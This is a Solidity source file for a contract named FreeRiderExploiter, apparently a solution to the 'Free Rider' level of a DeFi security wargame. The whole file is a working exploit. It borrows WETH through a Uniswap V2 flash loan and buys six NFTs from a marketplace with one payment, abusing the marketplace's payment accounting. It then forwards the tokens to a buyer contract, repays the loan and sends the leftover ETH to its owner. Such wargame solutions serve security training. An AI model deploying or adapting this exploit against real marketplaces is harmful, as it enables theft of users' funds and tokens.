// SPDX-License-Identifier: MIT
pragma solidity=0.6.6;

import '@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol';
import '@uniswap/v2-periphery/contracts/libraries/SafeMath.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';

interface IWETH {
    function deposit() external payable;
    function withdraw(uint) external;
    function transfer(
        address to, 
        uint value
    ) external returns (bool);
}

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IERC721 {
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

contract FreeRiderExploiter is IERC721Receiver {

    using SafeMath for uint256;

    address private uniswapFactory;
    address private tokenAddress;
    address private wethAddress;
    address private marketplace;
    address private nft;
    address private buyer;
    address private owner;

    constructor(
        address _uniswapFactory, 
        address _tokenAddress, 
        address _wethAddress, 
        address _marketplace, 
        address _nft, 
        address _buyer) 
    public {
        uniswapFactory = _uniswapFactory;
        tokenAddress = _tokenAddress;
        wethAddress = _wethAddress;
        marketplace = _marketplace;
        nft = _nft;
        buyer = _buyer;
        owner = msg.sender;
    }

    // @dev initiate exploit
    // @param _amountToBorrow The amount of ETH to borrow (NFT_PRICE)
    function startExploit(uint256 _amountToBorrow) external {
        address pairAddress = UniswapV2Library.pairFor(uniswapFactory,wethAddress,tokenAddress);
        require(pairAddress != address(0), "no pair.");

        // flashloan call
        IUniswapV2Pair(pairAddress).swap(
            _amountToBorrow, // WETH is the first token
            0,
            address(this), 
            bytes('not empty')
        );
    }

    // @dev callback function for the Uniswap flashloan
    function uniswapV2Call(
        address _sender,
        uint _amount0,
        uint _amount1,
        bytes calldata _data
    ) external {
        address pairAddress = UniswapV2Library.pairFor(uniswapFactory,wethAddress,tokenAddress);
        require(msg.sender == pairAddress,"invalid callback.");

        IWETH(wethAddress).withdraw(_amount0); // convert WETH to ETH

        uint256[] memory ids = new uint256[](6);
        for (uint256 i; i<6; i++) {
            ids[i]=i;
        }

        IFreeRiderNFTMarketplace(marketplace).buyMany{value:_amount0}(ids);
        
        for (uint256 i; i<6; i++) {
            IERC721(nft).safeTransferFrom(address(this),buyer,i);
        }
        
        uint256 loanPlusInterest = (_amount0.mul(10**18).mul(1000)/997/(10**18)).add(1); // exact amount owed
        
        IWETH(wethAddress).deposit{value:loanPlusInterest}();
        IWETH(wethAddress).transfer(pairAddress,loanPlusInterest);

        owner.call{value:address(this).balance}("");
    }

    // @dev NFT has been transfered to this contract, forward it to the FreeRiderBuyer
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes calldata
    ) 
        external
        override
        returns (bytes4) 
    {
        require(msg.sender == nft);
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {
    }

}